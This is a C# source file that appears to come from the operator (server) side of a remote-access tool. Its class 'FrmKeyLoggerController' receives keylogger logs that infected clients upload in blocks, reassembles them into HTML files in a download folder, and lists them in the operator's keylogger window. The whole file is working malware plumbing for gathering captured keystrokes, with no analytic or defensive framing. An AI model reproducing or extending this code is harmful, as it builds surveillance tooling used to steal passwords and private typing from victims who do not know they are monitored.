using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using System.IO;
using System.Text;

namespace Serveur.Controllers
{
    public static class FrmKeyLoggerController
    {
        public static void getKeyLoggerLogsResponse(ClientMosaic client, GetKeyLoggerLogsResponse packet)
        {
            if (client.value == null || client.value.frmKl == null)
                return;

            if(packet.fileCount == 0)
            {
                client.value.frmKl.SetGetLogsEnabled(true);
                return;
            }

            if (string.IsNullOrEmpty(packet.filename))
                return;

            string downloadPath = Path.Combine(client.value.downloadDirectory, "Logs\\");

            if (!Directory.Exists(downloadPath))
                Directory.CreateDirectory(downloadPath);

            downloadPath = Path.Combine(downloadPath, packet.filename + ".html");

            FileSplit destFile = new FileSplit(downloadPath);

            destFile.AppendBlock(packet.block, packet.currentBlock);

            if((packet.currentBlock +1) == packet.maxBlocks)
            {
                try
                {
                    File.WriteAllText(downloadPath, ReadLogFile(downloadPath));
                }
                catch
                {
                }

                if(packet.index == packet.fileCount)
                {
                    FileInfo[] iFiles = new DirectoryInfo(Path.Combine(client.value.downloadDirectory, "Logs\\")).GetFiles();

                    if (iFiles.Length == 0)
                        return;

                    foreach (FileInfo file in iFiles)
                    {
                        if(client.value == null || client.value.frmKl == null)                        
                            break;

                        client.value.frmKl.AddLogToListview(file.Name);                        
                    }
                    if (client.value == null || client.value.frmKl == null)
                        return;

                        client.value.frmKl.SetGetLogsEnabled(true);
                }
            }
        }

        /// <summary>
        /// Reads a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        public static string ReadLogFile(string filename)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(File.ReadAllBytes(filename)) : string.Empty;
        }
    }
}
